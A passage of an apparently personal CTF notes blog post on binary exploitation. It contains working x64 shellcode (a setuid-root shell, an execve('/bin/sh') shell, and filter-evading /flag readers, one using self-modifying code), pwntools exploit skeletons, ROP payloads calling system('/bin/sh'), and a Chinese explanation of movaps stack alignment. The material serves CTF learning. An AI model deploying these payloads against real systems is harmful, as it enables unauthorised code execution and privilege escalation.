edi        /* rdi = 0 (root UID) -&gt; 31 ff */</span><br><span class="line">    push 105            /* syscall 105 (0x69) = setuid */</span><br><span class="line">    pop rax             /* 6a 69 58 */</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* 1. Prepare null bytes and allocate stack space */</span><br><span class="line">    xor esi, esi</span><br><span class="line">    push rsi            /* 8-byte null terminator */</span><br><span class="line">    push rsi            /* space for /bin//sh */</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi             /* push rsp (0x54) + pop rdi (0x5f) avoids mov rdi, rsp (0x48) */</span><br><span class="line"></span><br><span class="line">    /* 2. Construct /bin//sh on the stack (using 32-bit ops to avoid REX.W) */</span><br><span class="line">    /* 0x6e69622f = &quot;nib/&quot;, 0x68732f2f = &quot;hs//&quot; (little-endian) */</span><br><span class="line">    mov dword ptr [rdi], 0x6e69622f</span><br><span class="line">    mov dword ptr [rdi+4], 0x68732f2f</span><br><span class="line"></span><br><span class="line">    /* 3. Set execve syscall number */</span><br><span class="line">    push 59</span><br><span class="line">    pop rax             /* avoids mov rax, 59 */</span><br><span class="line"></span><br><span class="line">    /* 4. Clear edx (envp) and execute */</span><br><span class="line">    xor edx, edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+<h3 id="x64-execvebinsh-22-23-bytes">x64 execve("/bin/sh") (22-23
+bytes)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; Standard 22-23 byte execve(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">; BITS 64</span><br><span class="line"></span><br><span class="line">xor rsi, rsi        ; Clear RSI (argv = NULL)</span><br><span class="line">push rsi            ; Push NULL terminator for string</span><br><span class="line">mov rbx, 0x68732f2f6e69622f ; &quot;/bin//sh&quot; in little-endian</span><br><span class="line">push rbx            ; Push string to stack</span><br><span class="line">push rsp            ; Push address of string</span><br><span class="line">pop rdi             ; RDI = address of &quot;/bin//sh&quot; (filename)</span><br><span class="line">mov al, 0x3b        ; RAX = 59 (execve syscall number)</span><br><span class="line">cdq                 ; RDX = 0 (envp = NULL) if RAX is positive</span><br><span class="line">syscall             ; Execute</span><br></pre></td></tr></table></figure>
+<h3 id="x64-cat-flag">x64 cat /flag</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.section .shellcode,&quot;awx&quot;</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    /* push b&#x27;/flag\x00&#x27; */</span><br><span class="line">    mov rax, 0x101010101010101</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0x101010101010101 ^ 0x67616c662f</span><br><span class="line">    xor [rsp], rax</span><br><span class="line">    /* call open(&#x27;rsp&#x27;, &#x27;O_RDONLY&#x27;, &#x27;rdx&#x27;) */</span><br><span class="line">    push 2</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, esi /* O_RDONLY */</span><br><span class="line">    syscall</span><br><span class="line">    /* call sendfile(1, &#x27;rax&#x27;, 0, 0x7fffffff) */</span><br><span class="line">    mov r10d, 0x7fffffff</span><br><span class="line">    mov rsi, rax</span><br><span class="line">    push 40 /* 0x28 */</span><br><span class="line">    pop rax</span><br><span class="line">    push 1</span><br><span class="line">    pop rdi</span><br><span class="line">    cdq /* rdx=0 */</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+<h3 id="x64-cat-flag-no-rex.w0x48">x64 cat /flag (No REX.W/0x48)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    /* 1. OPEN: open(&quot;/flag&quot;, O_RDONLY) -&gt; Syscall 2 */</span><br><span class="line">    xor esi, esi                    /* rsi = 0 (O_RDONLY) -&gt; 31 f6 */</span><br><span class="line">    push rsi                        /* null terminator */</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi                         /* rdi points to stack top (avoids mov rdi, rsp) */</span><br><span class="line"></span><br><span class="line">    /* Construct &quot;/flag&quot; using 32-bit and 8-bit writes */</span><br><span class="line">    /* &quot;/fla&quot; = 0x616c662f */</span><br><span class="line">    mov dword ptr [rdi], 0x616c662f /* c7 07 2f 66 6c 61 */</span><br><span class="line">    /* &quot;g&quot; = 0x67 */</span><br><span class="line">    mov byte ptr [rdi+4], 0x67      /* c6 47 04 67 */</span><br><span class="line"></span><br><span class="line">    push 2</span><br><span class="line">    pop rax                         /* open syscall number */</span><br><span class="line">    syscall                         /* fd returned in rax */</span><br><span class="line"></span><br><span class="line">    /* 2. READ: read(fd, buffer, size) -&gt; Syscall 0 */</span><br><span class="line">    xchg eax, edi                   /* rdi = fd, clears rax (0x97) */</span><br><span class="line"></span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi                         /* rsi = rsp (buffer) */</span><br><span class="line"></span><br><span class="line">    mov dl, 100                     /* rdx = 100 (size) using 8-bit register */</span><br><span class="line">    xor eax, eax                    /* read syscall number */</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* 3. WRITE: write(stdout, buffer, size) -&gt; Syscall 1 */</span><br><span class="line">    xchg eax, edx                   /* rdx = bytes read (0x92) */</span><br><span class="line"></span><br><span class="line">    push 1</span><br><span class="line">    pop rdi                         /* rdi = 1 (stdout) */</span><br><span class="line"></span><br><span class="line">    push 1</span><br><span class="line">    pop rax                         /* write syscall number */</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+<h3 id="x64-cat-flag-no-syscall-opcode">x64 cat /flag (No 'syscall'
+opcode)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.section .shellcode,&quot;awx&quot;</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    /* push b&#x27;/flag\x00&#x27; */</span><br><span class="line">    mov rax, 0x101010101010101</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0x101010101010101 ^ 0x67616c662f</span><br><span class="line">    xor [rsp], rax</span><br><span class="line">    /* call open(&#x27;rsp&#x27;, &#x27;O_RDONLY&#x27;, &#x27;rdx&#x27;) */</span><br><span class="line">    push 2</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, esi</span><br><span class="line">    inc byte ptr [rip + patch_target1 + 1]</span><br><span class="line">patch_target1:</span><br><span class="line">    .byte 0x0f</span><br><span class="line">    .byte 0x04            /* Patched to 0x0f05 at runtime */</span><br><span class="line">    /* call sendfile(1, &#x27;rax&#x27;, 0, 0x7fffffff) */</span><br><span class="line">    mov r10d, 0x7fffffff</span><br><span class="line">    mov rsi, rax</span><br><span class="line">    push 40</span><br><span class="line">    pop rax</span><br><span class="line">    push 1</span><br><span class="line">    pop rdi</span><br><span class="line">    cdq</span><br><span class="line">    inc byte ptr [rip + patch_target2 + 1]</span><br><span class="line">patch_target2:</span><br><span class="line">    .byte 0x0f</span><br><span class="line">    .byte 0x04</span><br></pre></td></tr></table></figure>
+<h1 id="common-terms">Common Terms</h1>
+<table>
+<colgroup>
+<col style="width: 12%" />
+<col style="width: 87%" />
+</colgroup>
+<thead>
+<tr>
+<th>Term</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>ROP</strong></td>
+<td>Return-Oriented Programming. Chaining "gadgets" ending in
+<code>ret</code>.</td>
+</tr>
+<tr>
+<td><strong>JOP/COP</strong></td>
+<td>Jump/Call-Oriented Programming. Chains indirect
+<code>jmp</code>/<code>call</code> dispatch instead of
+<code>ret</code>.</td>
+</tr>
+<tr>
+<td><strong>ret2win</strong></td>
+<td>Overwrite control flow to a hidden/success function in the
+binary.</td>
+</tr>
+<tr>
+<td><strong>ret2libc</strong></td>
+<td>Redirecting execution to a <code>libc</code> function instead of
+shellcode.</td>
+</tr>
+<tr>
+<td><strong>ret2plt</strong></td>
+<td>Calling a PLT stub in the binary, often to leak or invoke imported
+functions.</td>
+</tr>
+<tr>
+<td><strong>ret2csu</strong></td>
+<td>Using <code>__libc_csu_init</code> gadgets to set up multi-register
+function calls.</td>
+</tr>
+<tr>
+<td><strong>SROP</strong></td>
+<td>Sigreturn-Oriented Programming. Fake a signal frame to control
+registers.</td>
+</tr>
+<tr>
+<td><strong>PLT/GOT</strong></td>
+<td>Procedure Linkage Table &amp; Global Offset Table. Used for
+resolving external library function addresses.</td>
+</tr>
+<tr>
+<td><strong>OOB</strong></td>
+<td>Out-of-bounds. Accessing memory outside the intended range of an
+array or buffer.</td>
+</tr>
+<tr>
+<td><strong>UAF</strong></td>
+<td>Use-after-free. Reusing a pointer after its backing allocation has
+been freed.</td>
+</tr>
+<tr>
+<td><strong>SMC</strong></td>
+<td>Self-modifying code. Code patches its own bytes at runtime.</td>
+</tr>
+<tr>
+<td><strong>CET</strong></td>
+<td>Intel Control-flow Enforcement Technology: mainly <code>SHSTK</code>
+and <code>IBT</code>.</td>
+</tr>
+<tr>
+<td><strong>endbr64</strong></td>
+<td>Valid landing instruction required by IBT for indirect branch
+targets.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="exploit-skeletons">Exploit Skeletons</h1>
+<h2 id="localremote-toggle">Local/Remote Toggle</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./chall&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        set disassembly-flavor intel</span></span><br><span class="line"><span class="string">        break *main</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>, *a, **kw)</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(<span class="string">&quot;host&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start(env=&#123;&#125;)</span><br></pre></td></tr></table></figure>
+<p>Run with:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python solve.py</span><br><span class="line">python solve.py GDB</span><br><span class="line">python solve.py REMOTE</span><br></pre></td></tr></table></figure>
+<h2 id="leak-parsing">Leak Parsing</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;leak: &quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">raw = io.recvn(<span class="number">6</span>)</span><br><span class="line">addr = u64(raw.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="flat-payloads">Flat Payloads</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * offset,</span><br><span class="line">    canary,</span><br><span class="line">    <span class="string">b&quot;B&quot;</span> * <span class="number">8</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)),</span><br><span class="line">    libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="python-integer-to-byte-conversion">Python: Integer to Byte
+Conversion</h1>
+<p>In Python, converting an integer (0-255) to a byte string requires
+careful handling of the <code>bytes()</code> constructor:</p>
+<ul>
+<li><strong>Incorrect</strong>: <code>bytes(guess)</code>
+<ul>
+<li>If <code>guess = 5</code>, this creates a null-filled byte string of
+length 5: <code>b'\x00\x00\x00\x00\x00'</code>.</li>
+</ul></li>
+<li><strong>Correct</strong>: <code>bytes([guess])</code>
+<ul>
+<li>Passing a list (iterable) treats the integer as the actual byte
+value.</li>
+<li>If <code>guess = 65</code>, <code>bytes([65])</code> results in
+<code>b'A'</code> (<code>0x41</code>).</li>
+</ul></li>
+</ul>
+<h1 id="movaps">movaps</h1>
+<p><code>movaps</code> (Move Aligned Packed Single-Precision
+Floating-Point Values) 是 x86/x64 架构下的一条
+SIMD（单指令多数据流）指令，主要用于高效的数据传输。</p>
+<ul>
+<li><strong>SIMD 向量化处理与高吞吐率：</strong> 现代 CPU
+为了优化数据处理效率，会利用 XMM
+寄存器执行向量化操作。<code>movaps</code> 能够单次吞吐 128 位（16
+字节）的数据，极大地提升了内存带宽利用率。该指令被广泛应用于音视频编解码、图形渲染及密码学算法等密集型矩阵运算场景。</li>
+<li><strong>内存对齐 (Memory Alignment) 与缓存行 (Cache Line)
+机制：</strong> <code>movaps</code>
+是一条<strong>强制要求内存对齐</strong>的指令，要求操作数的内存首地址必须是
+16 的倍数（即 16 字节对齐）。现代 CPU 的 L1 数据缓存行通常为 64
+字节。强制 16 字节对齐保证了这 16
+字节的数据块绝对不会跨越两个不同的缓存行（Cache Line Boundary）。这使得
+CPU
+内部的内存控制器只需发起单次寻址操作即可完成数据读取，避免了跨缓存行读取带来的性能惩罚。</li>
+</ul>
+<h2 id="x64-rop-链中的栈对齐">x64 ROP 链中的栈对齐</h2>
+<p>在 64 位 Linux PWN（漏洞利用）中，通过 ROP 链调用
+<code>system()</code> 或 <code>printf()</code>
+等标准库函数时，常会遭遇程序崩溃。其根本原因在于破坏了系统调用约定的栈对齐规范。</p>
+<ul>
+<li><strong>System V AMD64 ABI 栈对齐规范</strong>: 在执行
+<code>call</code>
+指令跳转至目标函数前，<code>rsp % 16 == 0</code>。<code>call</code>
+会压入 8 字节返回地址，所以进入被调用函数第一条指令时通常是
+<code>rsp % 16 == 8</code>。标准函数序言再执行 <code>push rbp</code>
+后恢复到 <code>rsp % 16 == 0</code>。</li>
+<li><strong>触发 <code>#GP</code> 异常的根本原因：</strong>
+当攻击者通过缓冲区溢出劫持控制流，并利用 ROP 链直接跳转至
+<code>system("/bin/sh")</code> 时，往往忽略了对当前 <code>rsp</code>
+状态的维护。如果此时 <code>rsp</code> 存在 8 字节的偏移错位，当执行到
+Glibc 内部（如 <code>do_system</code> 或
+<code>vfprintf</code>）时，由于这些高频函数在 <code>-O3</code>
+优化级别下广泛使用 <code>movaps</code>
+指令来操作局部变量，<code>movaps</code>
+遇到未对齐的栈地址会直接触发硬件级别的 <strong>General Protection Fault
+(<code>#GP</code> 异常)</strong>，最终由操作系统内核向进程发送
+<code>SIGSEGV</code> 信号导致崩溃。</li>
+<li><strong>Exploit 解决方案：<code>ret</code> Gadget 栈平衡：</strong>
+在 ROP 链中，在目标函数（如
+<code>system</code>）的地址之前，预先插入一个极简的
+<strong><code>ret</code> Gadget</strong>（机器码
+<code>0xC3</code>）。<code>ret</code> 指令的语义等价于
+<code>pop rip</code>，它会将栈顶的 8 字节数据弹出。这 8
+字节的指针位移恰好起到了<strong>栈指针补偿</strong>的作用，将错位的
+<code>rsp</code> 重新调整至 16 字节对齐状态，从而规避
+<code>movaps</code> 导致的硬件异常。</li>
+</ul>
+<p>Quick fix:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = rop.find_gadget([<span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">payload = flat(<span class="string">b&quot;A&quot;</span> * offset, ret, pop_rdi, binsh, system)</span><br></pre></td></tr></table></figure>
+<h2 id="位-x86-对齐">32 位 (x86) 对齐</h2>
+<p>在 32 位漏洞利用中，因 <code>movaps</code>
+导致的崩溃概率显著降低，其架构与编译层面的原因如下：</p>
+<ul>
+<li><strong>调用约定 (Calling Convention) 的差异：</strong> 32
+位环境（如 <code>cdecl</code>）主要依赖<strong>栈传参</strong>，每次
+<code>push</code> 参数会导致栈指针 <code>esp</code> 发生 4
+字节的位移。这种高频的 4 字节扰动使得 16
+字节对齐极其难以在整个调用链中维持。</li>
+<li><strong>编译器的指令选择策略：</strong> 鉴于 32
+位下维护栈对齐的成本过高，编译器（尤其是旧版
+GCC）通常会采取降级策略：默认生成容错率更高的 <code>movups</code>
+指令（Move Unaligned，允许非对齐读取），或者直接放弃生成 SSE
+向量化指令，转而使用标量指令来处理普通 C 代码。</li>
+<li><strong>32 位的栈平滑方案：</strong> 如果在 32 位环境下确需解决 16
+字节对齐导致的崩溃，不能像 64 位那样简单粗暴地填充一个 <code>ret</code>
+指令。攻击者需要精确计算当前 <code>esp</code>
+距离目标对齐状态的偏移量（4 的倍数），并寻找相应数量的
+<code>pop &lt;reg&gt;</code>（例如 <code>pop eax; ret</code>）Gadget
+来进行微调，直到满足 <code>esp % 16 == 0</code> 的条件。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>vkkkv
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://vkkkv.github.io/ctf/ctf-03-binary/" title="Binary Exploitation - Architecture, Reversing, Exploitation &amp; Shellcode">https://vkkkv.github.io/ctf/ctf-03-binary/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/reverse/" rel="tag"><i class="fa fa-tag"></i> reverse</a>
+              <a href="/tags/shellcode/" rel="tag"><i class="fa fa-tag"></i> shellcode</a>
+              <a href="/tags/notes/" rel="tag"><i class="fa fa-tag"></i> notes</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/wp/umass2026/umassctf2026-brick-by-brick2/" rel="prev" title="UMass CTF 2026 - Brick by Brick">
+                  <i class="fa fa-angle-left"></i> UMass CTF 2026 - Brick by Brick
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/linux/yazi/" rel="next" title="Yazi File Manager Setup">
+                  Yazi File Manager Setup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">vkkkv</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9taXN0Lw==">NexT.Mist</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"blog-3yiidetljv","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/comments/disqus.min.js" defer></script>
+<!-- ============================================================
+     BACKGROUND HUD OVERLAYS
+     ============================================================ -->
+<!-- Scanlines + noise -->
+<div class="hud-background-overlay"></div>
+<div class="hud-data-wash"></div>
+
+<!-- Background Title Projection -->
+<div
+  class="hud-title-projection"
+  id="bg-title-projection"
+  style="display: none"
+></div>
+
+<script>
+  (function () {
+    const projection = document.getElementById("bg-title-projection");
+    if (!projection) return;
+
+    let activeAnchor = null;
+    let observer = null;
+    let rafId = null;
+
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
+    let currentY = 0; // 渲染位置
+    let targetY = 0; // 目标位置
+    let isUpdating = false; // 正在执行内容更新锁
+
+    function updateText(text) {
+      const newText = text.trim().toUpperCase();
+      if (!newText || projection.textContent === newText || isUpdating) return;
+
+      isUpdating = true;
+      projection.style.opacity = 0;
+
+      // 等待淡出完成后再执行内容和位置变更
+      setTimeout(() => {
+        projection.textContent = newText;
+
+        // 【关键】在文字不可见时，同步坐标位置，防止新标题出现时的“大幅度滑动”
+        if (activeAnchor) {
+          const rect = activeAnchor.getBoundingClientRect();
+          const centerY = window.innerHeight * 0.3;
+          targetY = currentY = (rect.top - centerY) * parallaxFactor;
+        }
+
+        projection.style.opacity = 1;
+        // 等待淡入完成后解锁
+        setTimeout(() => {
+          isUpdating = false;
+        }, 1200);
+      }, 1200);
+    }
+
+    function tick() {
+      if (activeAnchor) {
+        const rect = activeAnchor.getBoundingClientRect();
+        const centerY = window.innerHeight * 0.3;
+        targetY = (rect.top - centerY) * parallaxFactor;
+      }
+
+      // 仅在非更新期间应用平滑缓动
+      if (!isUpdating) {
+        currentY += (targetY - currentY) * lerpFactor;
+      }
+
+      projection.style.transform = `translate3d(-50%, ${currentY}px, 0)`;
+      rafId = requestAnimationFrame(tick);
+    }
+
+    function start() {
+      // 清理旧观察者，防止 PJAX 重复绑定
+      if (observer) observer.disconnect();
+
+      const targets = document.querySelectorAll(
+        ".post-title, .post-body h2, .post-body h3",
+      );
+
+      observer = new IntersectionObserver(
+        (entries) => {
+          // 找到正在进入视野的标题
+          const visible = entries.filter((e) => e.isIntersecting);
+          if (visible.length > 0) {
+            // 选取最上方的标题作为基准
+            const topOne = visible.sort(
+              (a, b) => a.boundingClientRect.top - b.boundingClientRect.top,
+            )[0];
+            activeAnchor = topOne.target;
+            updateText(topOne.target.textContent);
+          }
+        },
+        {
+          rootMargin: "-10% 0% -60% 0%",
+          threshold: 0,
+        },
+      );
+
+      targets.forEach((t) => observer.observe(t));
+
+      // 初始化或 PJAX 恢复
+      const initialTitle =
+        document.querySelector(".post-title") ||
+        document.querySelector(".site-title");
+      if (initialTitle) {
+        if (!projection.textContent) {
+          projection.textContent = initialTitle.textContent
+            .trim()
+            .toUpperCase();
+          projection.style.display = "block";
+          projection.style.opacity = 1;
+          activeAnchor = initialTitle;
+          const rect = initialTitle.getBoundingClientRect();
+          currentY = targetY =
+            (rect.top - window.innerHeight * 0.3) * parallaxFactor;
+        } else {
+          // PJAX 加载新页面，使用平滑切换
+          activeAnchor = initialTitle;
+          updateText(initialTitle.textContent);
+        }
+      }
+
+      // 确保只有一个动画循环在运行
+      if (!rafId) rafId = requestAnimationFrame(tick);
+    }
+
+    start();
+    document.addEventListener("pjax:success", start);
+  })();
+</script>
+
+<style>
+  .hud-title-projection {
+    position: fixed;
+    top: 30vh;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 10vw;
+    font-weight: 900;
+    color: rgba(255, 255, 255, 0.05);
+    text-transform: uppercase;
+    white-space: nowrap;
+    pointer-events: none;
+    z-index: -2;
+    user-select: none;
+    font-family: "Roboto Mono", monospace;
+    letter-spacing: -2px;
+    filter: blur(1.2px);
+    opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
+    transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+    will-change: transform, opacity;
+  }
+</style>
+
+<!-- Background Geometric Graphics -->
+<div class="hud-bg-graphic-right"></div>
+
+<!-- Particle Clusters -->
+<div
+  class="hud-particle-cluster"
+  style="bottom: 20%; right: 10%; width: 200px; height: 200px"
+>
+  <span style="top: 10%; left: 20%"></span>
+  <span style="top: 30%; left: 80%"></span>
+  <span style="top: 70%; left: 40%"></span>
+  <span style="top: 50%; left: 10%"></span>
+  <span style="top: 90%; left: 60%"></span>
+  <span style="top: 20%; left: 50%"></span>
+</div>
+
+<!-- Geometric decals: axis lines, rings, grid markers, dim text -->
+<div class="hud-geometric-decals">
+  <span class="axis-h" style="top: 35%"></span>
+  <span class="axis-v" style="left: 62%"></span>
+
+  <!-- Fragmented rings -->
+  <span
+    class="decal-ring"
+    style="
+      top: 8%;
+      right: -60px;
+      width: 220px;
+      height: 220px;
+      transform: rotate(12deg);
+    "
+  ></span>
+  <span
+    class="decal-ring"
+    style="
+      bottom: 15%;
+      left: -40px;
+      width: 180px;
+      height: 180px;
+      transform: rotate(-8deg);
+    "
+  ></span>
+  <span
+    class="decal-ring"
+    style="top: 55%; right: 30%; width: 140px; height: 140px"
+  ></span>
+
